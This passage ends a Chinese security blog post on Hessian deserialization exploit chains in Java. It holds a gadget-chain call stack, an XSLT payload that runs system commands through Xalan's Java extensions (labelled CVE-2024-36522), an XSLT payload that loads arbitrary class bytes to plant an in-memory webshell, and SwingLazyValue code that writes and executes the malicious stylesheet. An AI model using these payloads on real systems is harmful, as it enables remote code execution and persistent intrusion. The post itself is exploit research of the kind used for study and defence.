+invoke:62, NativeMethodAccessorImpl (sun.reflect)
+invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
+invoke:497, Method (java.lang.reflect)
+createValue:73, SwingLazyValue (sun.swing)
+getFromHashtable:216, UIDefaults (javax.swing)
+get:161, UIDefaults (javax.swing)
+toString:253, MimeTypeParameterList (javax.activation)
+valueOf:2994, String (java.lang)
+append:131, StringBuilder (java.lang)
+expect:2880, Hessian2Input (com.caucho.hessian.io)
+readString:1398, Hessian2Input (com.caucho.hessian.io)
+readObjectDefinition:2180, Hessian2Input (com.caucho.hessian.io)
+readObject:2122, Hessian2Input (com.caucho.hessian.io)
+</code></pre></div></details></li></ul><ul><li><ol start=3><li>XSLT</li></ol><p>XSLT 是一种样式转换标记语言，可以将 XML 文档转换成其他格式，比如 HTML。XSLT 包含了超过 100 个内置函数, 这些函数可以用于字符串、数值、日期和时间比较、节点和 QName 处理, 序列处理, 逻辑判断等等</p><p>我们可以将 XSLT 想象成模板引擎，在利用 SSTI 时我们通常需要用模板语言定义多个中间变量去构造完整的
+payload，XSLT 也提供了定义变量的元素 variable</p><pre><code class=language-xml>&lt;xsl:variable
+name=&quot;name&quot;
+select=&quot;expression&quot;&gt;
+  &lt;!-- Content:template --&gt;
+&lt;/xsl:variable&gt;
+</code></pre><p>其中 select 属性是一个表达式，可以灵活地通过各种功能函数去获取变量的值，如果没有控制好边界，攻击者可以通过 select 属性直接调用底层语言的方法/函数。比如：</p><pre><code class=language-java>&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;
+&lt;xsl:stylesheet version=&quot;1.0&quot;
+xmlns:xsl=&quot;http://www.w3.org/1999/XSL/Transform&quot;
+xmlns:rt=&quot;http://xml.apache.org/xalan/java/java.lang.Runtime&quot;
+xmlns:ob=&quot;http://xml.apache.org/xalan/java/java.lang.Object&quot;&gt;
+    &lt;xsl:template match=&quot;/&quot;&gt;
+    &lt;xsl:variable name=&quot;rtobject&quot; select=&quot;rt:getRuntime()&quot;/&gt;
+    &lt;xsl:variable name=&quot;process&quot; select=&quot;rt:exec($rtobject,'ls')&quot;/&gt;
+    &lt;xsl:variable name=&quot;processString&quot; select=&quot;ob:toString($process)&quot;/&gt;
+    &lt;xsl:value-of select=&quot;$processString&quot;/&gt;
+    &lt;/xsl:template&gt;
+&lt;/xsl:stylesheet&gt;
+</code></pre><div class=src-block-caption><span class=src-block-number>Code Snippet 8:</span>
+CVE-2024-36522</div><p>在进行反序列化黑名单绕过时（比如 NacOS），也常常通过 XSLT 绕过黑名单实现任意类加载（因为特征在字符串中，可以搭配各种编码混淆），从而写入内存马</p><pre><code class=language-xml>&lt;xsl:stylesheet version=&quot;1.0&quot;
+                xmlns:xsl=&quot;http://www.w3.org/1999/XSL/Transform&quot;
+                xmlns:b64=&quot;http://xml.apache.org/xalan/java/sun.misc.BASE64Decoder&quot;
+                xmlns:ob=&quot;http://xml.apache.org/xalan/java/java.lang.Object&quot;
+                xmlns:th=&quot;http://xml.apache.org/xalan/java/java.lang.Thread&quot;
+                xmlns:ru=&quot;http://xml.apache.org/xalan/java/org.springframework.cglib.core.ReflectUtils&quot;&gt;
+  &lt;xsl:template match=&quot;/&quot;&gt;
+    &lt;xsl:variable name=&quot;bs&quot; select=&quot;b64:decodeBuffer(b64:new(),'&lt;class_bytes_b64&gt;')&quot;/&gt;
+    &lt;xsl:variable name=&quot;cl&quot; select=&quot;th:getContextClassLoader(th:currentThread())&quot;/&gt;
+    &lt;xsl:variable name=&quot;rce&quot; select=&quot;ru:defineClass('&lt;class_name&gt;',$bs,$cl)&quot;/&gt;
+    &lt;xsl:value-of select=&quot;$rce&quot;/&gt;
+  &lt;/xsl:template&gt;
+&lt;/xsl:stylesheet&gt;
+</code></pre><p>结合 <a href=#code-snippet--SwingLazyValue><code>SwingLazyValue#createValue</code></a> 的反射调用利用点，可以使用
+<code>com.sun.org.apache.xalan.internal.xslt.Process#_main</code> 加载执行恶意 XSLT 代码，但是需要通过文件路径来加载，所以需要先写到文件中</p><figure><img src=/ox-hugo/_20241217_162115screenshot.png class="img-zoomable medium-zoom-image" alt=/ox-hugo/_20241217_162115screenshot.png></figure><ol><li>将恶意 XSLT 代码写入文件</li></ol><pre><code class=language-java>String evilXslt = &quot;&lt;恶意XSLT代码，比如上文的命令执行&gt;&quot;;
+SwingLazyValue value1 = new SwingLazyValue(&quot;com.sun.org.apache.xml.internal.security.utils.JavaUtils&quot;, &quot;writeBytesToFilename&quot;, new Object[]{&quot;/tmp/xslt_data&quot;, evilXslt.getBytes()});
+</code></pre><ol><li>加载解析 XSLT，触发命令执行</li></ol><pre><code class=language-java>SwingLazyValue value2 = new SwingLazyValue(&quot;com.sun.org.apache.xalan.internal.xslt.Process&quot;, &quot;_main&quot;, new Object[]{new String[]{&quot;-XT&quot;, &quot;-XSL&quot;, &quot;file:///tmp/xslt_data&quot;}});
+</code></pre></li></ul><h2 id=references>References</h2><ul><li><a href=https://su18.org/post/hessian/ target=_blank>https://su18.org/post/hessian/</a></li><li><a href=https://yzddmr6.com/posts/swinglazyvalue-in-webshell/ target=_blank>https://yzddmr6.com/posts/swinglazyvalue-in-webshell/</a></li></ul></div></article><div class="license markdown-body"><blockquote><p>Unless otherwise noted, the content of this site is licensed under <a rel=license href=http://creativecommons.org/licenses/by-nc-sa/4.0/ target=_blank>CC BY-NC-SA 4.0</a>.</p></blockquote></div><div class=post-comment data-comment=disqus><span class=post-comment-notloaded><i class="iconfont icon-chatbox-ellipses-sharp"></i>&nbsp;Load comments</span><div id=disqus_thread style=display:none></div><script>function loadComment(){var t=document.querySelector(".post-comment"),n=function(){this.page.url="https://zrquan.github.io/posts/hessian-deserialization/",this.page.identifier="hessian-deserialization"},e=document.createElement("script");e.src="https://4shen0ne.disqus.com/embed.js",e.setAttribute("data-timestamp",+new Date),document.querySelector("#disqus_thread").removeAttribute("style"),(document.body||document.head).appendChild(e),document.querySelector("span.post-comment-notloaded").setAttribute("style","display: none;")}</script></div></div><aside class="col-12 col-md-3 float-left sidebar"><div class="sidebar-item sidebar-pages"><h3>Pages</h3><ul><li><a href=/>Home</a></li><li><a href=/archives/>Archives</a></li><li><a href=/search/>Search</a></li><li><a href=/index.xml>Feed</a></li></ul></div><div class="sidebar-item sidebar-toc"><h3>Table of Contents</h3><nav id=TableOfContents><ul><li><a href=#hello-hessian>Hello Hessian</a><ul><li><a href=#示例-servlet>示例：Servlet</a></li><li><a href=#示例-springboot>示例：SpringBoot</a></li></ul></li><li><a href=#远程调用过程>远程调用过程</a><ul><li><a href=#hessianservlet>HessianServlet</a></li><li><a href=#hessianskeleton>HessianSkeleton</a></li><li><a href=#协议版本>协议版本</a></li></ul></li><li><a href=#序列化过程>序列化过程</a><ul><li><a href=#serializable-和-transient>Serializable 和 transient</a></li></ul></li><li><a href=#反序列化过程>反序列化过程</a></li><li><a href=#利用链分析>利用链分析</a><ul><li><a href=#rome>Rome</a></li><li><a href=#swing>Swing</a></li></ul></li><li><a href=#references>References</a></li></ul></nav></div></aside></div><div class=btn><div class=btn-menu id=btn-menu><i class="iconfont icon-grid-sharp"></i></div><div class=btn-toggle-mode><i class="iconfont icon-contrast-sharp"></i></div><div class=btn-scroll-top><i class="iconfont icon-chevron-up-circle-sharp"></i></div></div><aside class=sidebar-mobile style=display:none><div class=sidebar-wrapper><div class="sidebar-item sidebar-pages"><h3>Pages</h3><ul><li><a href=/>Home</a></li><li><a href=/archives/>Archives</a></li><li><a href=/search/>Search</a></li><li><a href=/index.xml>Feed</a></li></ul></div><div class="sidebar-item sidebar-links"><h3>Links</h3><ul><li><a href=https://github.com/zrquan target=_blank><span>GitHub</span></a></li><li><a href=https://notes-bice-five.vercel.app/ target=_blank><span>Notes</span></a></li></ul></div><div class="sidebar-item sidebar-tags"><h3>Tags</h3><div><span><a href=/tags/ctf/>Ctf</a>
+</span><span><a href=/tags/cve/>Cve</a>
+</span><span><a href=/tags/deserialize/>Deserialize</a>
+</span><span><a href=/tags/emacs/>Emacs</a>
+</span><span><a href=/tags/fastjson/>Fastjson</a>
+</span><span><a href=/tags/hessian/>Hessian</a>
+</span><span><a href=/tags/java/>Java</a>
+</span><span><a href=/tags/kotlin/>Kotlin</a>
+</span><span><a href=/tags/org-mode/>Org-Mode</a>
+</span><span><a href=/tags/web/>Web</a></span></div></div><div class="sidebar-item sidebar-toc"><h3>Table of Contents</h3><nav id=TableOfContents><ul><li><a href=#hello-hessian>Hello Hessian</a><ul><li><a href=#示例-servlet>示例：Servlet</a></li><li><a href=#示例-springboot>示例：SpringBoot</a></li></ul></li><li><a href=#远程调用过程>远程调用过程</a><ul><li><a href=#hessianservlet>HessianServlet</a></li><li><a href=#hessianskeleton>HessianSkeleton</a></li><li><a href=#协议版本>协议版本</a></li></ul></li><li><a href=#序列化过程>序列化过程</a><ul><li><a href=#serializable-和-transient>Serializable 和 transient</a></li></ul></li><li><a href=#反序列化过程>反序列化过程</a></li><li><a href=#利用链分析>利用链分析</a><ul><li><a href=#rome>Rome</a></li><li><a href=#swing>Swing</a></li></ul></li><li><a href=#references>References</a></li></ul></nav></div></div></aside></main><footer><div class="container-lg clearfix"><div class="col-12 footer"><span>&copy; 2021-2024
+<a href=https://zrquan.github.io/>zrquan</a>
+| <a href=https://github.com/zrquan/zrquan.github.io>Source code</a>
+| Powered by <a href=https://github.com/andrew-aiken/hugo-theme-fuji/ target=_blank>Fuji</a> & <a href=https://gohugo.io/ target=_blank>Hugo</a></span></div></div></footer><script defer src=https://cdn.jsdelivr.net/npm/medium-zoom@1.0.6/dist/medium-zoom.min.js></script><script defer src=https://cdn.jsdelivr.net/npm/lazysizes@5.3.0/lazysizes.min.js></script><script defer src=https://cdn.jsdelivr.net/npm/prismjs@1.23.0/components/prism-core.min.js></script><script defer src=https://cdn.jsdelivr.net/npm/prismjs@1.23.0/plugins/autoloader/prism-autoloader.min.js></script><script defer src=/assets/js/fuji.min.js></script><script async src=https://unpkg.com/mermaid@8.2.3/dist/mermaid.min.js></script></body></html>
